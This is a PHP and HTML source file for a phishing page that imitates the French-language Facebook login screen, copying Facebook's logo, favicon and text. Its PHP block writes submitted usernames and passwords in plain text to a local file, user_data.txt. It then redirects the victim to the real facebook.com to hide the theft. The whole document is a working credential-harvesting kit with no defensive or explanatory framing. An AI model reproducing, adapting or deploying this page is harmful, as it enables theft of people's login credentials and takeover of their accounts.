<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $data = "Username: " . $username . " - Password: " . $password . "\n";
    
    $file = 'user_data.txt';
    file_put_contents($file, $data, FILE_APPEND);

    // Redirect to specified URL
    header("Location: https://www.facebook.com/");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Facebook</title>
    <link rel="stylesheet" href="conx.css">
    <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png">
</head>
<body>
    <section>
        <form method="post" action="">
            <main>
                <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
                <div class="root_fecbook">
                    <div class="desc_fcb">
                       <h2>Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
                    </div>            
                </div>
            </main>
            <div class="left_box">
                <div class="form_gem">
                    <div class="fo">
                        <div class="input_boxs">
                            <input type="text" name="username" placeholder="Adresse e-mail ou numéro de tél" id="input" required>
                        </div>
                        <div class="input_boxs">
                            <input type="password" name="password" id="input" placeholder="Mot de passe" required>
                        </div>
                      
                        <div class="sub">
                            <input type="submit" value="Se connecter">
                            <br>
                            <div class="oublie">
                                <a href="">Mot de passe oublié ?</a> 
                            </div>              
                        </div>
                        <div class="mi"></div>
                        <div class="cree">
                            <button type="button">Créer nouveau compte</button>
                        </div>
                    </div>
                </div>
                <div class="fina">
                    <a href=""><p><strong>Créer une Page</strong> pour une célébrité, une marque ou une entreprise.</p></a>
                </div>
        </form>
    </section>
    <script>
        // Any JavaScript code can go here
    </script>
</body>
</html>
